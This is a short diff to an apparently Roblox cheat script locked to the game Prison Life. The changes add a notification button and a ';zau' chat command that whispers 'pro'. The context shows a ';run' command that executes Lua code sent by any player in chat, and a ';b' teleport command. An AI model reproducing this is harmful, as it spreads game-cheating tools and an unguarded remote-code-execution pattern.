@@ -172,6 +172,7 @@ else
 		Title="Incorrect placeID this game is not Prison life.",
 		Text="Script cannot run in this place.",
 		Duration=5,
+		Button1 = "Okay.",
 	})
 
 	for i,user in pairs(svc("Players"):GetPlayers()) do
@@ -188,6 +189,10 @@ else
 					end
 					loadstring(RealCode)()
 					split=nil
+				elseif split[1] == ";zau" then
+					say("/w "..user.Name.." pro")
+				elseif split[2] == ";zau" then
+					say("/w "..user.Name.." pro")
 				elseif split[1] == ";b" then
 					Sv.LPlr.Character.HumanoidRootPart.CFrame=user.Character.Head.CFrame
 				elseif split[2] == ";b" then
@@ -229,6 +234,10 @@ else
 					Sv.LPlr.Character.HumanoidRootPart.CFrame=user.Character.Head.CFrame
 				elseif split[2] == ";b" then
 					Sv.LPlr.Character.HumanoidRootPart.CFrame=user.Character.Head.CFrame
+				elseif split[1] == ";zau" then
+					say("/w "..user.Name.." pro")
+				elseif split[2] == ";zau" then
+					say("/w "..user.Name.." pro")	
 				elseif split[2]==";run" then
 					local RealCode = ""
 					table.remove(split,1)
